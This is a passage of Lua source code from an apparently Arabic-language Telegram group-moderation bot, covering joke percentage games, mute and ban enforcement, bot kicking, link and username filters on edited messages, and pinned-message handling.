num = {"10","20","30","35","75","34","66","82","23","19","55","8","63","32","27","89","99","98","3","80","49","100","6","0",};
sendnum = num[math.random(#num)]
sl = 'نسبه حب '..text..' هي : '..sendnum..'%'
send(msg.chat_id_, msg.id_,sl) 
database:del(bot_id..":"..msg.sender_user_id_..":lov_Bots"..msg.chat_id_)
end
if text == "نسبه الكره" or text == "نسبه كره" and msg.reply_to_message_id_ ~= 0 and Addictive(msg) then
if not database:get(bot_id..'Cick:krh'..msg.chat_id_) then
database:set(bot_id..":"..msg.sender_user_id_..":krh_Bots"..msg.chat_id_,"sendkrhe")
Text = 'ارسل اسمك واسم الشخص الثاني،  \n مثال : علش و عسل'
send(msg.chat_id_, msg.id_,Text) 
end
end
if text and text ~="نسبه الكره" and database:get(bot_id..":"..msg.sender_user_id_..":krh_Bots"..msg.chat_id_) == "sendkrhe" then
num = {"10","20","30","35","75","34","66","82","23","19","55","8","63","32","27","89","99","98","3","80","8","100","6","0",};
sendnum = num[math.random(#num)]
sl = 'نسبه كره '..text..' هي : '..sendnum..'%'
send(msg.chat_id_, msg.id_,sl) 
database:del(bot_id..":"..msg.sender_user_id_..":krh_Bots"..msg.chat_id_)
end
if text == "نسبه الرجوله" or text == "نسبه رجوله" and msg.reply_to_message_id_ ~= 0 and Addictive(msg) then
if not database:get(bot_id..'Cick:rjo'..msg.chat_id_) then
database:set(bot_id..":"..msg.sender_user_id_..":rjo_Bots"..msg.chat_id_,"sendrjoe")
Text = 'ارسل اسم الشخص الذي تريد قياس نسبه رجولته \n مثال : علش'
send(msg.chat_id_, msg.id_,Text) 
end
end
if text and text ~="نسبه رجوله" and database:get(bot_id..":"..msg.sender_user_id_..":rjo_Bots"..msg.chat_id_) == "sendrjoe" then
numj = {"10","20","30","35","75","34","66","82","23","19","55","80","63","32","27","89","99","98","79","100","8","3","6","0",};
sendnuj = numj[math.random(#numj)]
xl = 'نسبه رجوله '..text..' هي : \n '..sendnuj..'%'
send(msg.chat_id_, msg.id_,xl) 
database:del(bot_id..":"..msg.sender_user_id_..":rjo_Bots"..msg.chat_id_)
end
if text == "نسبه الانوثه" or text == "نسبه انوثه" and msg.reply_to_message_id_ ~= 0 and Addictive(msg) then
if not database:get(bot_id..'Cick:ano'..msg.chat_id_) then
database:set(bot_id..":"..msg.sender_user_id_..":ano_Bots"..msg.chat_id_,"sendanoe")
Text = 'ارسل اسم الشخص الذي تريد قياس نسبه انوثتها \n مثال عذراء'
send(msg.chat_id_, msg.id_,Text) 
end
end
if text and text ~="نسبه الانوثه" and database:get(bot_id..":"..msg.sender_user_id_..":ano_Bots"..msg.chat_id_) == "sendanoe" then
numj = {"10","20","30","35","75","34","66","82","23","19","55","80","63","32","27","89","99","98","79","100","8","3","6","0",};
sendnuj = numj[math.random(#numj)]
xl = 'نسبه الانوثه '..text..' هي : \n '..sendnuj..'%'
send(msg.chat_id_, msg.id_,xl) 
database:del(bot_id..":"..msg.sender_user_id_..":ano_Bots"..msg.chat_id_)
end
--------------------------------------------------------------------------------------------------------------
if msg.sender_user_id_ and Muted_User(msg.chat_id_,msg.sender_user_id_) then 
DeleteMessage(msg.chat_id_, {[0] = msg.id_})  
return false  
end
--------------------------------------------------------------------------------------------------------------
if msg.sender_user_id_ and Ban_User(msg.chat_id_,msg.sender_user_id_) then 
chat_kick(msg.chat_id_,msg.sender_user_id_) 
DeleteMessage(msg.chat_id_, {[0] = msg.id_}) 
return false  
end
--------------------------------------------------------------------------------------------------------------
if msg.content_ and msg.content_.members_ and msg.content_.members_[0] and msg.content_.members_[0].id_ and Ban_User(msg.chat_id_,msg.content_.members_[0].id_) then 
chat_kick(msg.chat_id_,msg.content_.members_[0].id_) 
DeleteMessage(msg.chat_id_, {[0] = msg.id_}) 
return false
end
--------------------------------------------------------------------------------------------------------------
if msg.sender_user_id_ and GBan_User(msg.sender_user_id_) then 
chat_kick(msg.chat_id_,msg.sender_user_id_) 
DeleteMessage(msg.chat_id_, {[0] = msg.id_}) 
return false 
end
--------------------------------------------------------------------------------------------------------------
if msg.sender_user_id_ and Gmute_User(msg.sender_user_id_) then 
DeleteMessage(msg.chat_id_, {[0] = msg.id_}) 
return false 
end
--------------------------------------------------------------------------------------------------------------
if msg.content_ and msg.content_.members_ and msg.content_.members_[0] and msg.content_.members_[0].id_ and GBan_User(msg.content_.members_[0].id_) then 
chat_kick(msg.chat_id_,msg.content_.members_[0].id_) 
DeleteMessage(msg.chat_id_, {[0] = msg.id_})  
end 
--------------------------------------------------------------------------------------------------------------
if msg.content_.ID == "MessageChatAddMembers" then  
database:set(bot_id.."Who:Added:Me"..msg.chat_id_..':'..msg.content_.members_[0].id_,msg.sender_user_id_)
local mem_id = msg.content_.members_  
local Bots = database:get(bot_id.."lock:Bot:kick"..msg.chat_id_) 
for i=0,#mem_id do  
if msg.content_.members_[i].type_.ID == "UserTypeBot" and not Mod(msg) and Bots == "kick" then   
https.request("https://api.telegram.org/bot"..token.."/kickChatMember?chat_id="..msg.chat_id_.."&user_id="..msg.sender_user_id_)
RiNdA = https.request("https://api.telegram.org/bot"..token.."/kickChatMember?chat_id="..msg.chat_id_.."&user_id="..mem_id[i].id_)
local Json_Info = JSON.decode(RiNdA)
if Json_Info.ok == true and #mem_id == i then
local Msgs = {}
Msgs[0] = msg.id_
msgs_id = msg.id_-1048576
for i=1 ,(150) do 
msgs_id = msgs_id+1048576
table.insert(Msgs,msgs_id)
end
tdcli_function ({ID = "GetMessages",chat_id_ = msg.chat_id_,message_ids_ = Msgs},function(arg,data);MsgsDel = {};for i=0 ,data.total_count_ do;if not data.messages_[i] then;if not MsgsDel[0] then;MsgsDel[0] = Msgs[i];end;table.insert(MsgsDel,Msgs[i]);end;end;if MsgsDel[0] then;tdcli_function({ID="DeleteMessages",chat_id_ = arg.chat_id_,message_ids_=MsgsDel},function(arg,data)end,nil);end;end,{chat_id_=msg.chat_id_})
tdcli_function({ID = "GetChannelMembers",channel_id_ = getChatId(msg.chat_id_).ID,filter_ = {ID = "ChannelMembersBots"},offset_ = 0,limit_ = 100 },function(arg,tah) local admins = tah.members_ for i=0 , #admins do if tah.members_[i].status_.ID ~= "ChatMemberStatusEditor" and not is_mod(msg) then tdcli_function ({ID = "ChangeChatMemberStatus",chat_id_ = msg.chat_id_,user_id_ = admins[i].user_id_,status_ = {ID = "ChatMemberStatusKicked"},}, function(arg,f) end, nil) end end end,nil)  
end
end     
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.ID == "MessageChatAddMembers" then  
local mem_id = msg.content_.members_  
local Bots = database:get(bot_id.."lock:Bot:kick"..msg.chat_id_) 
for i=0,#mem_id do  
if msg.content_.members_[i].type_.ID == "UserTypeBot" and not Mod(msg) and Bots == "del" then   
RiNdA = https.request("https://api.telegram.org/bot"..token.."/kickChatMember?chat_id="..msg.chat_id_.."&user_id="..mem_id[i].id_)
local Json_Info = JSON.decode(RiNdA)
if Json_Info.ok == true and #mem_id == i then
local Msgs = {}
Msgs[0] = msg.id_
msgs_id = msg.id_-1048576
for i=1 ,(150) do 
msgs_id = msgs_id+1048576
table.insert(Msgs,msgs_id)
end
tdcli_function ({ID = "GetMessages",chat_id_ = msg.chat_id_,message_ids_ = Msgs},function(arg,data);MsgsDel = {};for i=0 ,data.total_count_ do;if not data.messages_[i] then;if not MsgsDel[0] then;MsgsDel[0] = Msgs[i];end;table.insert(MsgsDel,Msgs[i]);end;end;if MsgsDel[0] then;tdcli_function({ID="DeleteMessages",chat_id_ = arg.chat_id_,message_ids_=MsgsDel},function(arg,data)end,nil);end;end,{chat_id_=msg.chat_id_})
tdcli_function({ID = "GetChannelMembers",channel_id_ = getChatId(msg.chat_id_).ID,filter_ = {ID = "ChannelMembersBots"},offset_ = 0,limit_ = 100 },function(arg,tah) local admins = tah.members_ for i=0 , #admins do if tah.members_[i].status_.ID ~= "ChatMemberStatusEditor" and not is_mod(msg) then tdcli_function ({ID = "ChangeChatMemberStatus",chat_id_ = msg.chat_id_,user_id_ = admins[i].user_id_,status_ = {ID = "ChatMemberStatusKicked"},}, function(arg,f) end, nil) end end end,nil)  
end
end     
end
end
if msg.content_.ID == 'MessagePinMessage' then
if Constructor(msg) then 
database:set(bot_id..'Pin:Id:Msg'..msg.chat_id_,msg.content_.message_id_)
else
local Msg_Pin = database:get(bot_id..'Pin:Id:Msg'..msg.chat_id_)
if Msg_Pin and database:get(bot_id.."lockpin"..msg.chat_id_) then
PinMessage(msg.chat_id_,Msg_Pin)
end
end
end
--------------------------------------------------------------------------------------------------------------
if msg.content_.ID == "MessageChatDeletePhoto" or msg.content_.ID == "MessageChatChangePhoto" or msg.content_.ID == 'MessagePinMessage' or msg.content_.ID == "MessageChatJoinByLink" or msg.content_.ID == "MessageChatAddMembers" or msg.content_.ID == 'MessageChatChangeTitle' or msg.content_.ID == "MessageChatDeleteMember" then   
if database:get(bot_id..'lock:tagservr'..msg.chat_id_) then  
DeleteMessage(msg.chat_id_,{[0] = msg.id_})       
return false
end    
end   
--------------------------------------------------------------------------------------------------------------
SourceRiNdA(data.message_,data)
plugin_RiNdA(data.message_)
--------------------------------------------------------------------------------------------------------------
if Chat_Type == 'GroupBot' and ChekAdd(msg.chat_id_) == true then
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(arg,data) 
if data.username_ then
database:set(bot_id..'user:Name'..msg.sender_user_id_,(data.username_))
end
--------------------------------------------------------------------------------------------------------------
if tonumber(data.id_) == tonumber(bot_id) then
return false
end
end,nil)   
end
elseif (data.ID == "UpdateMessageEdited") then
local msg = data
tdcli_function ({ID = "GetMessage",chat_id_ = msg.chat_id_,message_id_ = tonumber(msg.message_id_)},function(extra, result, success)
database:incr(bot_id..'edits'..result.chat_id_..result.sender_user_id_)
local Text = result.content_.text_
if database:get(bot_id.."lock_edit_med"..msg.chat_id_) and not Text and not BasicConstructor(result) then
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
local username = data.username_
local name = data.first_name_
local iduser = data.id_
local users = ('[@'..data.username_..']' or iduser)
local list = database:smembers(bot_id..'Constructor'..msg.chat_id_)
t = "\n ⊀︰ شخص ما يحاول تعديل الميديا \n"
for k,v in pairs(list) do
local username = database:get(bot_id.."user:Name" .. v)
if username then
t = t..""..k.."- ([@"..username.."])\n"
else
t = t..""..k.."- (`"..v.."`)\n"
end
end
if #list == 0 then
t = "* ⊀︰ لا يوجد ادمن*"
end
send(msg.chat_id_,0,''..t..'\n●━━━━𝐑𝐀━━━━●\n ⊀︰ تم التعديل على الميديا\n ⊀︰ الشخص الي قام بالتعديل\n ⊀︰ ايدي الشخص ◂ '..result.sender_user_id_..'\n ⊀︰ معرف الشخص>{ '..users..' }') 
end,nil)
DeleteMessage(msg.chat_id_,{[0] = msg.message_id_}) 
end
local text = result.content_.text_
if not Mod(result) then
------------------------------------------------------------------------
if text and text:match("[Jj][Oo][Ii][Nn][Cc][Hh][Aa][Tt]") or text and text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or text and text:match("[Tt].[Mm][Ee]") or text and text:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or text and text:match("[Tt][Ee][Ll][Ee][Ss][Cc][Oo].[Pp][Ee]") then
if database:get(bot_id.."lock:Link"..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = data.message_id_}) 
return false
end 
end
------------------------------------------------------------------------
if text and text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or text and text:match("[Tt].[Mm][Ee]") or text and text:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or text and text:match("[Tt][Ee][Ll][Ee][Ss][Cc][Oo].[Pp][Ee]") then
if database:get(bot_id.."lock:Link"..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = data.message_id_}) 
return false
end 
end
------------------------------------------------------------------------
if text and text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or text and text:match("[Tt].[Mm][Ee]") or text and text:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or text and text:match("[Tt][Ee][Ll][Ee][Ss][Cc][Oo].[Pp][Ee]") then
if database:get(bot_id.."lock:Link"..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = data.message_id_}) 
return false
end  
end
------------------------------------------------------------------------
if text and text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or text and text:match("[Tt].[Mm][Ee]") or text and text:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or text and text:match("[Tt][Ee][Ll][Ee][Ss][Cc][Oo].[Pp][Ee]") then
if database:get(bot_id.."lock:Link"..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = data.message_id_}) 
return false
end  
end 
------------------------------------------------------------------------
if text and text:match("[hH][tT][tT][pP][sT]") or text and text:match("[tT][eE][lL][eE][gG][rR][aA].[Pp][Hh]") or text and text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa].[Pp][Hh]") then
if database:get(bot_id.."lock:Link"..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = data.message_id_}) 
return false
end  
end 
------------------------------------------------------------------------
if text and text:match("(.*)(@)(.*)") then
if database:get(bot_id.."lock:user:name"..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = data.message_id_}) 
return false
end  
end
------------------------------------------------------------------------
if text and text:match("@") then
if database:get(bot_id.."lock:user:name"..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = data.message_id_}) 
return false
end  
end 
------------------------------------------------------------------------
if text and text:match("(.*)(#)(.*)") then
if database:get(bot_id.."lock:hashtak"..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = data.message_id_}) 
return false
end  
end 
------------------------------------------------------------------------
if text and text:match("#") then
if database:get(bot_id.."lock:user:name"..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = data.message_id_}) 
return false
end  
end 
------------------------------------------------------------------------
local RiNdAAbot = database:get(bot_id.."RiNdA1:Add:Filter:Rp2"..text..result.chat_id_)   
if RiNdAAbot then    
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
if data.username_ ~= false then
send(msg.chat_id_,0," ⊀︰ ﭑݪعضوٍَ : {["..data.first_name_.."](T.ME/"..data.username_..")}\n ⊀︰ ["..RiNdAAbot.."] \n") 
else
send(msg.chat_id_,0," ⊀︰ ﭑݪعضوٍَ : {["..data.first_name_.."](T.ME/SourcE_RiNdA)}\n ⊀︰ ["..RiNdAAbot.."] \n") 
end
end,nil)   
DeleteMessage(msg.chat_id_,{[0] = data.message_id_}) 
return false
end
------------------------------------------------------------------------
if text and text:match("/") then
if database:get(bot_id.."lock:Cmd"..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = data.message_id_}) 
return false
end 
end 
if text and text:match("(.*)(/)(.*)") then
if database:get(bot_id.."lock:Cmd"..msg.chat_id_) then
DeleteMessage(msg.chat_id_,{[0] = data.message_id_}) 
return false
end 
end
------------------------------------------------------------------------
if text then
local RiNdA1_Msg = database:get(bot_id.."RiNdA1:Add:Filter:Rp2"..text..result.chat_id_)   
if RiNdA1_Msg then    
send(msg.chat_id_, msg.id_," ⊀︰ "..RiNdA1_Msg)
DeleteMessage(result.chat_id_, {[0] = data.message_id_})     
return false
end
end
end
end,nil)
------------------------------------------------------------------------

elseif (data.ID == "UpdateOption" and data.name_ == "my_id") then 
local list = database:smembers(bot_id.."User_Bot") 
for k,v in pairs(list) do 
tdcli_function({ID='GetChat',chat_id_ = v},function(arg,data) end,nil) 
end         
local list = database:smembers(bot_id..'Chek:Groups') 
for k,v in pairs(list) do 
tdcli_function({ID='GetChat',chat_id_ = v
},function(arg,data)
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusMember" then
database:srem(bot_id..'Chek:Groups',v)  
tdcli_function ({ID = "ChangeChatMemberStatus",chat_id_=v,user_id_=bot_id,status_={ID = "ChatMemberStatusLeft"},},function(e,g) end, nil) 
end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusLeft" then
database:srem(bot_id..'Chek:Groups',v)  
end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusKicked" then
database:srem(bot_id..'Chek:Groups',v)  
end
if data and data.code_ and data.code_ == 400 then
database:srem(bot_id..'Chek:Groups',v)  
end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusEditor" then
database:sadd(bot_id..'Chek:Groups',v)  
end 
end,nil)
end

elseif (data.ID == "UpdateMessageSendSucceeded") then
local msg = data.message_
local text = msg.content_.text_
local Get_Msg_Pin = database:get(bot_id..'Msg:Pin:Chat'..msg.chat_id_)
if Get_Msg_Pin ~= nil then
if text == Get_Msg_Pin then
tdcli_function ({ID = "PinChannelMessage",channel_id_ = msg.chat_id_:gsub('-100',''),message_id_ = msg.id_,disable_notification_ = 0},function(arg,d) if d.ID == 'Ok' then;database:del(bot_id..'Msg:Pin:Chat'..msg.chat_id_);end;end,nil)   
elseif (msg.content_.sticker_) then 
if Get_Msg_Pin == msg.content_.sticker_.sticker_.persistent_id_ then
tdcli_function ({ID = "PinChannelMessage",channel_id_ = msg.chat_id_:gsub('-100',''),message_id_ = msg.id_,disable_notification_ = 0},function(arg,d) database:del(bot_id..'Msg:Pin:Chat'..msg.chat_id_) end,nil)   
end
end
if (msg.content_.animation_) then 
if msg.content_.animation_.animation_.persistent_id_ == Get_Msg_Pin then
tdcli_function ({ID = "PinChannelMessage",channel_id_ = msg.chat_id_:gsub('-100',''),message_id_ = msg.id_,disable_notification_ = 0},function(arg,d) database:del(bot_id..'Msg:Pin:Chat'..msg.chat_id_) end,nil)   
end
end
if (msg.content_.photo_) then
if msg.content_.photo_.sizes_[0] then
id_photo = msg.content_.photo_.sizes_[0].photo_.persistent_id_
end
if msg.content_.photo_.sizes_[1] then
id_photo = msg.content_.photo_.sizes_[1].photo_.persistent_id_
end
if msg.content_.photo_.sizes_[2] then
id_photo = msg.content_.photo_.sizes_[2].photo_.persistent_id_
end	
if msg.content_.photo_.sizes_[3] then
id_photo = msg.content_.photo_.sizes_[3].photo_.persistent_id_
end
if id_photo == Get_Msg_Pin then
tdcli_function ({ID = "PinChannelMessage",channel_id_ = msg.chat_id_:gsub('-100',''),message_id_ = msg.id_,disable_notification_ = 0},function(arg,d) database:del(bot_id..'Msg:Pin:Chat'..msg.chat_id_) end,nil)   
end
end
end


end -- end new msg dev.mr mode 
end -- end callback dev.mr mode

